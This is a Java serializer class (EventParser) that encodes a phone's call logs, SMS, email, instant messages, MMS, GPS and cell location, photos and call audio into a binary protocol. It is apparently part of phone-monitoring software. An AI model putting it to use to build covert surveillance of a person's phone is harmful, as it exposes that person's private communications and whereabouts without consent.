package com.vvt.prot.parser;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;

import com.vvt.prot.event.Attachment;
import com.vvt.prot.event.AudioConvThumbnailEvent;
import com.vvt.prot.event.AudioThumbnailEvent;
import com.vvt.prot.event.CallLogEvent;
import com.vvt.prot.event.CameraImageThumbnailEvent;
import com.vvt.prot.event.CellInfoEvent;
import com.vvt.prot.event.EmailEvent;
import com.vvt.prot.event.GPSEvent;
import com.vvt.prot.event.GPSExtraFields;
import com.vvt.prot.event.GPSField;
import com.vvt.prot.event.IMEvent;
import com.vvt.prot.event.MMSEvent;
import com.vvt.prot.event.PEvent;
import com.vvt.prot.event.Recipient;
import com.vvt.prot.event.SMSEvent;
import com.vvt.prot.event.SystemEvent;
import com.vvt.std.ByteUtil;
import com.vvt.std.IOUtil;

public class EventParser {

	public static byte[] parseEvent(PEvent event) throws IOException {
		byte[] data = null;
		
		if (event instanceof CallLogEvent) {
			data = parseEvent((CallLogEvent) event);
		} else if (event instanceof SMSEvent) {
			data = parseEvent((SMSEvent) event);
		} else if (event instanceof EmailEvent) {
			data = parseEvent((EmailEvent) event);
		} else if (event instanceof GPSEvent) {
			data = parseEvent((GPSEvent)event);
		} else if (event instanceof CellInfoEvent) {
			data = parseEvent((CellInfoEvent)event);
		} else if (event instanceof IMEvent) {
			data = parseEvent((IMEvent)event);
		} else if (event instanceof MMSEvent) {
			data = parseEvent((MMSEvent)event);
		} else if (event instanceof SystemEvent) {
			data = parseEvent((SystemEvent) event);
		} else if (event instanceof CameraImageThumbnailEvent) {
			data = parseEvent((CameraImageThumbnailEvent) event);
		} else if (event instanceof AudioThumbnailEvent) {
			data = parseEvent((AudioThumbnailEvent) event);
		} else if (event instanceof AudioConvThumbnailEvent) {
			data = parseEvent((AudioConvThumbnailEvent) event);
		}
		return data;
	}
	
	private static byte[] parseEvent(CallLogEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(bos);
		byte[] data = null;
		try {
			// EventType 2 Bytes.
			short eventType = (short)event.getEventType().getID();
			dos.write(ByteUtil.toByte(eventType));
			// EventTime 19 Bytes.
			String eventTime = event.getEventTime();
			dos.write(ByteUtil.toByte(eventTime));
			// Direction 1 Byte.
			byte direction = (byte)event.getDirection().getId();
			dos.write(ByteUtil.toByte(direction));
			// Duration 4 Bytes.
			int duration = event.getDuration();
			dos.write(ByteUtil.toByte(duration));
			// Length of Number 1 Byte.
			String number = event.getAddress();
			byte lenNumber = (byte)number.length();
			dos.write(ByteUtil.toByte(lenNumber));
			if (lenNumber > 0) {
				// Number n Bytes.
				dos.write(ByteUtil.toByte(number));
			}
			// Length of Contact Name 1 Byte.
			String contact = event.getContactName();
			byte lenContact = (byte)contact.length();
			dos.write(ByteUtil.toByte(lenContact));
			if (lenContact > 0) {
				// Contact Name n Bytes.
				dos.write(ByteUtil.toByte(contact));
			}
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(dos);
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(SMSEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(bos);
		byte[] data = null;
		try {
			// EventType 2 Bytes.
			short eventType = (short)event.getEventType().getID();
			dos.write(ByteUtil.toByte(eventType));
			// EventTime 19 Bytes.
			String eventTime = event.getEventTime();
			dos.write(ByteUtil.toByte(eventTime));
			// Direction 1 Byte.
			byte direction = (byte)event.getDirection().getId();
			dos.write(ByteUtil.toByte(direction));
			// Length of Number 1 Byte.
			String number = event.getAddress();
			byte lenNumber = (byte)number.length();
			dos.write(ByteUtil.toByte(lenNumber));
			if (lenNumber > 0) {
				// Number n Bytes.
				dos.write(ByteUtil.toByte(number));
			}
			// Length of Contact Name 1 Byte.
			String contact = event.getContactName();
			byte lenContact = (byte)contact.length();
			dos.write(ByteUtil.toByte(lenContact));
			if (lenContact > 0) {
				// Contact Name n Bytes.
				dos.write(ByteUtil.toByte(contact));
			}
			// Number of Recipient 2 Bytes (Integer).
			short numberOfRecipient = event.countRecipient();
			dos.write(ByteUtil.toByte(numberOfRecipient));
			if (numberOfRecipient > 0) {
				for (int i = 0; i < numberOfRecipient; i++) {
					Recipient recipient = event.getRecipient(i);
					// Recipient Type 1 Byte.
					byte recipientType = (byte)recipient.getRecipientType().getId();
					dos.write(ByteUtil.toByte(recipientType));
					// Length of Recipient 1 Byte.
					String recipientInfo = recipient.getRecipient();
					byte lenRecipient = (byte)recipientInfo.length();
					dos.write(ByteUtil.toByte(lenRecipient));
					if (lenRecipient > 0) {
						// Recipient n Bytes.
						dos.write(ByteUtil.toByte(recipientInfo));
					}
					// Length of Contact Name 1 Byte.
					String contactName = recipient.getContactName();
					byte lenContactName = (byte)contactName.length();
					dos.write(ByteUtil.toByte(lenContactName));
					if (lenContactName > 0) {
						// Contact Name n Bytes.
						dos.write(ByteUtil.toByte(contactName));
					}
				}
			}
			// Length of Message 2 Bytes.
			String message = event.getMessage();
			short lenMsg = (short)message.length();
			dos.write(ByteUtil.toByte(lenMsg));
			if (lenMsg > 0) {
				// Message n Bytes.
				dos.write(ByteUtil.toByte(message));
			}
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(dos);
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(EmailEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(bos);
		byte[] data = null;
		try {
			// EventType 2 Bytes.
			short eventType = (short)event.getEventType().getID();
			dos.write(ByteUtil.toByte(eventType));
			// EventTime 19 Bytes.
			String eventTime = event.getEventTime();
			dos.write(ByteUtil.toByte(eventTime));
			// Direction 1 Byte.
			byte direction = (byte)event.getDirection().getId();
			dos.write(ByteUtil.toByte(direction));
			// Length of Number 1 Byte.
			String number = event.getAddress();
			byte lenNumber = (byte)number.length();
			dos.write(ByteUtil.toByte(lenNumber));
			if (lenNumber > 0) {
				// Number n Bytes.
				dos.write(ByteUtil.toByte(number));
			}
			// Length of Contact Name 1 Byte.
			String contact = event.getContactName();
			byte lenContact = (byte)contact.length();
			dos.write(ByteUtil.toByte(lenContact));
			if (lenContact > 0) {
				// Contact Name n Bytes.
				dos.write(ByteUtil.toByte(contact));
			}
			// Number of Recipient 2 Bytes (Integer).
			short numberOfRecipient = event.countRecipient();
			dos.write(ByteUtil.toByte(numberOfRecipient));
			for (int i = 0; i < numberOfRecipient; i++) {
				Recipient recipient = event.getRecipient(i);
				// Recipient Type 1 Byte.
				byte recipientType = (byte)recipient.getRecipientType().getId();
				dos.write(ByteUtil.toByte(recipientType));
				// Length of Recipient 1 Byte.
				String recipientInfo = recipient.getRecipient();
				byte lenRecipient = (byte)recipientInfo.length();
				dos.write(ByteUtil.toByte(lenRecipient));
				if (lenRecipient > 0) {
					// Recipient n Bytes.
					dos.write(ByteUtil.toByte(recipientInfo));
				}
				// Length of Contact Name 1 Byte.
				String contactName = recipient.getContactName();
				byte lenContactName = (byte)contactName.length();
				dos.write(ByteUtil.toByte(lenContactName));
				if (lenContactName > 0) {
					// Contact Name n Bytes.
					dos.write(ByteUtil.toByte(contactName));
				}
			}
			// Length of Subject 2 Bytes.
			String subject = event.getSubject();
			short lenSubject = (short)subject.length();
			dos.write(ByteUtil.toByte(lenSubject));
			if (lenSubject > 0) {
				// Subject n Bytes.
				dos.write(ByteUtil.toByte(subject));
			}
			// Number of Attachment 1 Byte (Integer(U)).
			byte numberOfAttachment = (byte)event.countAttachment();
			dos.write(ByteUtil.toByte(numberOfAttachment));
			if (numberOfAttachment > 0) {
				for (int i = 0; i < numberOfAttachment; i++) {
					Attachment attachment = event.getAttachment(i);
					String attachmentFullName = attachment.getAttachmentFullName();
					if (attachmentFullName != null) {
						short lenAttachmentFullName = (short)attachmentFullName.length();
						dos.write(ByteUtil.toByte(lenAttachmentFullName));
						dos.write(ByteUtil.toByte(attachmentFullName));
					} else {
						dos.write(ByteUtil.toByte((short)0));
					}
					byte[] attachmentData = attachment.getAttachmentData();
					 if (attachmentData != null) {
						 int lenAttachmentData = attachmentData.length;
						 dos.write(ByteUtil.toByte(lenAttachmentData));
						 dos.write(attachmentData);
					 } else {
						 dos.write(ByteUtil.toByte((int)0));
					 }
				}
			}
			// Length of Message 4 Bytes.
			String message = event.getMessage();
			int lenMsg = message.length();
			dos.write(ByteUtil.toByte(lenMsg));
			if (lenMsg > 0) {
				// Message n Bytes.
				dos.write(ByteUtil.toByte(message));
			}
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(dos);
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(GPSEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(bos);
		byte[] data = null;
		try {
			// EventType 2 Bytes.
			short eventType = (short)event.getEventType().getID();
			dos.write(ByteUtil.toByte(eventType));
			// EventTime 19 Bytes.
			String eventTime = event.getEventTime();
			dos.write(ByteUtil.toByte(eventTime));
			// Longitude 8 Bytes. (Decimal)
			double lng = event.getLongitude();
			dos.write(ByteUtil.toByte(lng));
			// Latitude 8 Bytes. (Decimal)
			double lat = event.getLatitude();
			dos.write(ByteUtil.toByte(lat));
			// Number of GPS Field 1 Byte.
			byte numberOfField = (byte)event.countGPSField();
			dos.write(ByteUtil.toByte(numberOfField));
			if (numberOfField > 0) {
				for (int i = 0; i < numberOfField; i++) {
					// Field ID 1 Byte
					GPSField field = event.getGpsField(i);
					byte fieldId = (byte)field.getGpsFieldId();
					dos.write(ByteUtil.toByte(fieldId));
					if (fieldId == (byte)GPSExtraFields.PROVIDER.getId()) {
						// Field Data 1 Byte.
						byte fieldData = (byte)field.getGpsFieldData();
						dos.write(ByteUtil.toByte(fieldData));
					}
					else {
						// Field Data 4 bytes.
						float fieldData = field.getGpsFieldData();
						dos.write(ByteUtil.toByte(fieldData));
					}
				}
			}
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(dos);
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(CellInfoEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(bos);
		byte[] data = null;
		try {
			// EventType 2 Bytes.
			short eventType = (short)event.getEventType().getID();
			dos.write(ByteUtil.toByte(eventType));
			// EventTime 19 Bytes.
			String eventTime = event.getEventTime();
			dos.write(ByteUtil.toByte(eventTime));
			// Length of Network ID 1 Byte.
			String networkId = event.getNetworkId();
			byte lenNetworkId = (byte)networkId.length();
			dos.write(ByteUtil.toByte(lenNetworkId));
			if (lenNetworkId > 0) {
				// Network ID n Bytes.
				dos.write(ByteUtil.toByte(networkId));
			}
			// Length of Network Name 1 Byte.
			String networkName = event.getNetworkName();
			byte lenNetworkName = (byte)networkName.length();
			dos.write(ByteUtil.toByte(lenNetworkName));
			if (lenNetworkName > 0) {
				// Network Name n Bytes.
				dos.write(ByteUtil.toByte(networkName));
			}
			// Length of Network Name 1 Byte.
			String cellName = event.getCellName();
			byte lenCellName = (byte)cellName.length();
			dos.write(ByteUtil.toByte(lenCellName));
			if (lenCellName > 0) {
				// Network Name n Bytes.
				dos.write(ByteUtil.toByte(cellName));
			}
			// Cell ID 4 Bytes.
			int cellId = (int)event.getCellId();
			dos.write(ByteUtil.toByte(cellId));
			// Country Code 4 Bytes.
			int countryCode = (int)event.getCountryCode();
			dos.write(ByteUtil.toByte(countryCode));
			// Area Code 4 Bytes.
			int areaCode = (int)event.getAreaCode();
			dos.write(ByteUtil.toByte(areaCode));
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(dos);
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(IMEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(bos);
		byte[] data = null;
		try {
			// EventType 2 Bytes.
			short eventType = (short)event.getEventType().getID();
			dos.write(ByteUtil.toByte(eventType));
			// EventTime 19 Bytes.
			String eventTime = event.getEventTime();
			if (eventTime.length() > 0) {
				dos.write(ByteUtil.toByte(eventTime));
			}			
			// Direction 1 Byte.
			byte direction = (byte)event.getDirection().getId();
			dos.write(ByteUtil.toByte(direction));
			//Length of User_ID 1 Byte.
			String userID = event.getUserID();
			if (userID != null) {
				byte lenUserID = (byte)userID.length();
				if (lenUserID > 0) {
					dos.write(ByteUtil.toByte(lenUserID));
					// User_ID n Bytes.
					dos.write(ByteUtil.toByte(userID));		
				} else {
					dos.write(ByteUtil.toByte((byte)0));
				}		
			} else {
				dos.write(ByteUtil.toByte((byte)0));
			}
			//Count 2 Bytes.
			short count = (short)event.countParticipant();
			dos.write(ByteUtil.toByte(count));
			if (count > 0) {
				for (int i = 0; i < count; i++) {
					//Length of Name 1 Byte.
					String name = event.getParticipant(i).getName();
					if (name != null) {
						byte lenName = (byte)name.length();
						if (lenName > 0) {
							dos.write(ByteUtil.toByte(lenName));
							dos.write(ByteUtil.toByte(name));
						} else {
							dos.write(ByteUtil.toByte((byte)0));
						}
					} else {
						dos.write(ByteUtil.toByte((byte)0));
					}
					String uid = event.getParticipant(i).getUID();
					if (uid != null) {
						byte lenUID = (byte)uid.length();
						if (lenUID > 0) {
							dos.write(ByteUtil.toByte(lenUID));
							dos.write(ByteUtil.toByte(uid));
						} else {
							dos.write(ByteUtil.toByte((byte)0));
						}						
					} else {
						dos.write(ByteUtil.toByte((byte)0));
					}
				}
			}
			String serviceID = event.getServiceID().toString();
			if (serviceID != null) {
				//Length of Service ID 1 Byte.
				byte lenServiceID = (byte)serviceID.length();
				if (lenServiceID > 0) {
					dos.write(ByteUtil.toByte(lenServiceID));
					//Service ID n Bytes.
					dos.write(ByteUtil.toByte(serviceID));
				} else {
					dos.write(ByteUtil.toByte((byte)0));
				}
			} else {
				dos.write(ByteUtil.toByte((byte)0));
			}
			String message = event.getMessage();
			if (message != null) {
				//Length of Message 2 Bytes.
				short lenMessage = (short)message.length();
				if (lenMessage > 0) {
					dos.write(ByteUtil.toByte(lenMessage));
					dos.write(ByteUtil.toByte(message));
				} else {
					dos.write(ByteUtil.toByte((byte)0));
				}
			} else {
				dos.write(ByteUtil.toByte((byte)0));
			}
			String userDspName = event.getUserDisplayName();
			if (userDspName != null) {
				//Length of User Display Name 1 Byte.
				byte lenUserDspName = (byte)userDspName.length();
				if (lenUserDspName > 0) {
					dos.write(ByteUtil.toByte(lenUserDspName));
					dos.write(ByteUtil.toByte(userDspName));
				} else {
					dos.write(ByteUtil.toByte((byte)0));
				}
			} else {
				dos.write(ByteUtil.toByte((byte)0));
			}
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(dos);
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(MMSEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(bos);
		byte[] data = null;
		try {
			// EventType 2 Bytes.
			short eventType = (short)event.getEventType().getID();
			dos.write(ByteUtil.toByte(eventType));
			// EventTime 19 Bytes.
			String eventTime = event.getEventTime();
			dos.write(ByteUtil.toByte(eventTime));
			// Direction 1 Byte.
			byte direction = (byte)event.getDirection().getId();
			dos.write(ByteUtil.toByte(direction));
			String senderNumb = event.getSenderNumber();
			//Length of Sender Number 1 Byte.
			byte lenSenderNumb = (byte)senderNumb.length();
			dos.write(ByteUtil.toByte(lenSenderNumb));
			if (lenSenderNumb > 0) {
				//Sender Number n Bytes.
				dos.write(ByteUtil.toByte(senderNumb));
			}
			String contactName = event.getContactName();
			//Length of Contact Name 1 Byte.
			byte lenContactName = (byte)contactName.length();
			dos.write(ByteUtil.toByte(lenContactName));
			if (lenContactName > 0) {
				dos.write(ByteUtil.toByte(contactName));
			}
			short lenRecipientCnt = event.countRecipient();
			dos.write(ByteUtil.toByte(lenRecipientCnt));
			if (lenRecipientCnt > 0) {
				for (int i = 0; i < lenRecipientCnt; i++) {
					//RECIPIENT_TYPE 
					short recipientType = (short)event.getRecipient(i).getRecipientType().getId();
					dos.write(ByteUtil.toByte(recipientType));
					String recipient = event.getRecipient(i).getRecipient();
					//Length of RECIPIENT 1 Byte.
					byte lenRecipient = (byte)recipient.length();
					dos.write(ByteUtil.toByte(lenRecipient));
					if (lenRecipient > 0) {
						dos.write(ByteUtil.toByte(recipient));
					}
					contactName = event.getRecipient(i).getContactName();
					lenContactName = (byte)contactName.length();
					dos.write(ByteUtil.toByte(lenContactName));
					if (lenContactName > 0) {
						dos.write(ByteUtil.toByte(contactName));
					}
				}
			}
			String subject = event.getSubject();
			//Length of Subject 2 Bytes.
			short lenSubject = (short)subject.length();
			dos.write(ByteUtil.toByte(lenSubject));
			if (lenSubject > 0) {
				dos.write(ByteUtil.toByte(subject));
			}
			//Length of L_ATTACHMENT_COUNT 1 Byte.
			byte lenAttachment = event.countAttachment();
			dos.write(ByteUtil.toByte(lenAttachment));
			if (lenAttachment > 0) {
				for (int i = 0; i < lenAttachment; i++) {
					String attachmentFullName = event.getAttachment(i).getAttachmentFullName();
					//Length of AttachmentFullName 2 Bytes.
					short lenAttachmentFullName = (short)attachmentFullName.length();
					dos.write(ByteUtil.toByte(lenAttachmentFullName));
					if (lenAttachmentFullName > 0) {
						dos.write(ByteUtil.toByte(attachmentFullName));
					}
					byte[] attachmentData = event.getAttachment(i).getAttachmentData();
					//Length of AttachmentData 4 Bytes.
					int lenAttachmentData = attachmentData.length;
					dos.write(ByteUtil.toByte(lenAttachmentData));
					if (lenAttachmentData > 0) {
						dos.write(attachmentData);
					}
				}				
			}
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(dos);
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(SystemEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(bos);
		byte[] data = null;
		try {
			// EventType 2 Bytes.
			short eventType = (short)event.getEventType().getID();
			dos.write(ByteUtil.toByte(eventType));
			// EventTime 19 Bytes.
			String eventTime = event.getEventTime();
			dos.write(ByteUtil.toByte(eventTime));
			/*//TODO Log Type
			byte logType = (byte)event.getLogType().getId(); 
			dos.write(ByteUtil.toByte(logType));*/
			byte category = (byte)event.getCategory().getId();
			dos.write(ByteUtil.toByte(category));
			byte direction = (byte)event.getDirection().getId();
			dos.write(ByteUtil.toByte(direction));
			String systemMsg = event.getSystemMessage();
			if (systemMsg != null) {
				int lenSystemMsg = systemMsg.length();
				dos.write(ByteUtil.toByte(lenSystemMsg));
				dos.write(ByteUtil.toByte(systemMsg));
			} else {
				dos.write(ByteUtil.toByte((int)0));
			}
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(dos);
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(CameraImageThumbnailEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(bos);
		byte[] data = null;
		try {
			// EventType 2 Bytes.
			short eventType = (short)event.getEventType().getID();
			dos.write(ByteUtil.toByte(eventType));
			// EventTime 19 Bytes.
			String eventTime = event.getEventTime();
			if (eventTime == null) {
				eventTime = "0000-00-00 00:00:00";
			} 
			dos.write(ByteUtil.toByte(eventTime));
			//ParingId
			int paringId = (int)event.getPairingId(); 
			dos.write(ByteUtil.toByte(paringId));
			byte format = (byte)event.getFormat().getId();
			dos.write(ByteUtil.toByte(format));
			//GEOTAG
			double longitude = event.getLongitude();
			dos.write(ByteUtil.toByte(longitude));
			double lattitude = event.getLattitude();
			dos.write(ByteUtil.toByte(lattitude));
			float altitude = event.getAltitude();
			dos.write(ByteUtil.toByte(altitude));
			byte[] imageData = event.getImageData();
			int lenImageData = imageData.length;
			if (lenImageData > 0) {
				dos.write(ByteUtil.toByte(lenImageData));
				dos.write(imageData);
			} else {
				dos.write(ByteUtil.toByte(lenImageData));
			}
			int actualSize = (int)event.getActualSize();
			dos.write(ByteUtil.toByte(actualSize));
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(dos);
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(AudioThumbnailEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(bos);
		byte[] data = null;
		try {
			// EventType 2 Bytes.
			short eventType = (short)event.getEventType().getID();
			dos.write(ByteUtil.toByte(eventType));
			// EventTime 19 Bytes.
			String eventTime = event.getEventTime();
			dos.write(ByteUtil.toByte(eventTime));
			//ParingId
			int paringId = (int)event.getPairingId(); 
			dos.write(ByteUtil.toByte(paringId));
			byte format = (byte)event.getFormat().getId();
			dos.write(ByteUtil.toByte(format));
			byte[] audioData = event.getAudioData();
			int lenAudioData = audioData.length;
			if (lenAudioData > 0) {
				dos.write(ByteUtil.toByte(lenAudioData));
				dos.write(audioData);
			} else {
				dos.write(ByteUtil.toByte(lenAudioData));
			}
			int actualSize = (int)event.getActualSize();
			dos.write(ByteUtil.toByte(actualSize));
			int actualDuration = (int)event.getActualDuration();
			dos.write(ByteUtil.toByte(actualDuration));
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(dos);
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(AudioConvThumbnailEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(bos);
		byte[] data = null;
		try {
			// EventType 2 Bytes.
			short eventType = (short)event.getEventType().getID();
			dos.write(ByteUtil.toByte(eventType));
			// EventTime 19 Bytes.
			String eventTime = event.getEventTime();
			dos.write(ByteUtil.toByte(eventTime));
			//ParingId
			int paringId = (int)event.getPairingId(); 
			dos.write(ByteUtil.toByte(paringId));
			byte format = (byte)event.getFormat().getId();
			dos.write(ByteUtil.toByte(format));
			//Embeded_Call_Info
			byte direction = (byte)event.getDirection().getId();
			dos.write(ByteUtil.toByte(direction));
			int duration = (int)event.getDuration();
			dos.write(ByteUtil.toByte(duration));
			String number = event.getAddress();
			byte lenNumber = (byte)number.length();
			if (lenNumber > 0) {
				dos.write(ByteUtil.toByte(lenNumber));
				dos.write(ByteUtil.toByte(number));
			} else {
				dos.write(ByteUtil.toByte((byte)0));
			}
			String contactName = event.getContactName();
			byte lenContactName = (byte)contactName.length();
			if (lenContactName > 0) {
				dos.write(ByteUtil.toByte(lenContactName));
				dos.write(ByteUtil.toByte(contactName));
			} else {
				dos.write(ByteUtil.toByte((byte)0));
			}
			byte[] audioData = event.getAudioData();
			int lenAudioData = audioData.length;
			if (lenAudioData > 0) {
				dos.write(ByteUtil.toByte(lenAudioData));
				dos.write(audioData);
			} else {
				dos.write(ByteUtil.toByte(lenAudioData));
			}
			int actualSize = (int)event.getActualSize();
			dos.write(ByteUtil.toByte(actualSize));
			int actualDuration = (int)event.getActualDuration();
			dos.write(ByteUtil.toByte(actualDuration));
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(dos);
			IOUtil.close(bos);
		}
		return data;
	}
}
